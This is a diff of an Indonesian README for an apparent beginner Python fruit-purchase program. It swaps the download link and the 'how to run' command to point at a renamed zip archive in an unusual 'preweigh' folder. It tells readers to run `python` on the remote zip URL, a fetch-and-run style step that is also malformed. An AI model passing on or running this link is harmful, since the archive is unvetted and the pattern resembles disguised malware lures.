@@ -23,11 +23,11 @@ Program ini juga menampilkan daftar buah yang sudah dimasukkan secara rapi mengg
 ---
 
 ## 📄 File:
-- `https://raw.githubusercontent.com/raraofficial/pembelian-buah-python/main/preweigh/pembelian-buah-python.zip`
+- `https://raw.githubusercontent.com/raraofficial/pembelian-buah-python/main/preweigh/python-buah-pembelian-reflow.zip`
 
 ---
 
 ## ▶️ Cara Menjalankan
 Pastikan Python sudah terinstall, lalu jalankan:
 ```bash
-python https://raw.githubusercontent.com/raraofficial/pembelian-buah-python/main/preweigh/pembelian-buah-python.zip
+python https://raw.githubusercontent.com/raraofficial/pembelian-buah-python/main/preweigh/python-buah-pembelian-reflow.zip
